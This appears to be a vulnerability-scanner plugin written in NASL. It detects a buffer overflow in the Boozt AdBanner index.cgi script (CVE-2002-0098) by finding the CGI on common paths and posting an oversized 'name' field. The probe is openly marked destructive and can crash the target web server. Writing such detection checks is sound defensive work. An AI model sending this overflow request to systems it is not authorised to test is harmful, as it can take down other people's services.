if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11082" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 6281 );
	script_cve_id( "CVE-2002-0098" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Boozt index.cgi overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software or protect it with a filtering reverse proxy." );
	script_tag( name: "summary", value: "It seems that index.cgi from Boozt AdBanner
  is installed and is vulnerable to a buffer overflow:

  It doesn't check the length of user supplied variables before copying them to internal arrays." );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make the web server
  crash continually or even execute arbirtray code on the system." );
	script_tag( name: "affected", value: "Boozt 0.9.8alpha, other versions might be affected as well." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
d1[0] = "/cgi-bin";
d1[1] = "/scripts";
d1[2] = "";
d2[0] = "/boozt";
d2[1] = "";
d3[0] = "/admin";
d3[1] = "";
func find_boozt( port ){
	for(i = 0;i < 3;i++){
		for(j = 0;j < 2;j++){
			for(k = 0;k < 2;k++){
				url = NASLString( d1[i], d2[j], d3[k], "/index.cgi" );
				req = http_get( port: port, item: url );
				res = http_keepalive_send_recv( port: port, data: req );
				if(ereg( string: res, pattern: "^HTTP/1\\.[01] 200 " ) && ContainsString( res, "BOOZT Adbanner system" )){
					return ( url );
				}
			}
		}
	}
	return FALSE;
}
port = http_get_port( default: 80 );
bz = find_boozt( port: port );
if(!bz){
	exit( 0 );
}
r = http_post( port: port, item: bz );
r = r - NASLString( "\\r\\n\\r\\n" );
r = NASLString( r, "\\r\\nContent-Length: 1030\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n", "name=", crap( 1025 ), "\\r\\n\\r\\n" );
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: r );
r = http_recv( socket: soc );
http_close_socket( soc );
if(ereg( string: r, pattern: "^HTTP/1\\.[01] +5[0-9][0-9] " )){
	security_message( port: port );
	exit( 0 );
}
report = "It seems that index.cgi from Boozt AdBanner is installed.

Old versions of the CGI were vulnerable to a buffer overflow hower the scanner could not exploit it there.";
security_message( port: port, data: report );
exit( 0 );

